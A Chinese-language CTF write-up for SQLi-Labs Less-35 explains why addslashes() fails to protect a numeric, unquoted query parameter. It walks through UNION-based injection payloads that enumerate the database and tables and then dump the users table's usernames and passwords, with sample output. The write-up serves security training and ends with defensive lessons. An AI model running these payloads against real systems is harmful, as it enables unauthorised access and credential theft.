【SQLi-Labs】Less-35 数字型注入与防御错位 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 数字型注入

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-35 (GET - why care for addslashes)
  • 提示：页面回显了转义结果，但属于纯数字型注入，无需引号闭合。

2. 核心原理：防御策略错位

本关卡是经典的“防御用错地方”案例。后端使用了 addslashes() 函数，该函数的作用是在单引号 '、双引号 "、反斜杠 \ 之前添加反斜杠进行转义。

然而，根据源码，本关卡的 SQL 查询语句为纯数字型：id=$id，并没有使用任何引号包裹。由于注入过程完全不需要闭合引号，直接拼接 SQL 逻辑语句即可，因此 addslashes() 在这里毫无用武之地。

3. 操作步骤与解析

第一步：探测与爆库名

输入 URL：?id=-1 union select 1,2,database()-- -

回显现象：页面回显 Your Login name:2，Your Password:security。

解释与原理：使用 -1 作为占位符使前置查询为空。由于不需要闭合任何字符，直接追加 UNION SELECT 语句，将数据库名回显在第 2 列。

第二步：爆表名

输入 URL：?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -

回显现象：页面回显 emails,referers,uagents,users。

第三步：直接脱库

输入 URL：?id=-1 union select 1,2,group_concat(username,0x3a,password) from users-- -

回显现象：页面成功爆出所有用户的账号密码，包括 admin:p@ssw0rd。

4. 踩坑记录与复盘

  • 思维定势：看到提示信息里的 escaped as（转义），不要立刻条件反射去使用宽字节 %df。应先通过构造简单 Payload（如 ?id=1 和 ?id=1'）测试当前是字符型还是数字型上下文。
  • 防御对齐：安全防护措施必须与业务上下文匹配。对数字型参数使用字符型转义函数是一种无效防御。

5. 知识点总结

  • 数字型注入：不需要闭合符，直接使用逻辑运算（如 and、union）拼接。
  • 安全策略的局限性：了解 addslashes 的原理及适用边界。
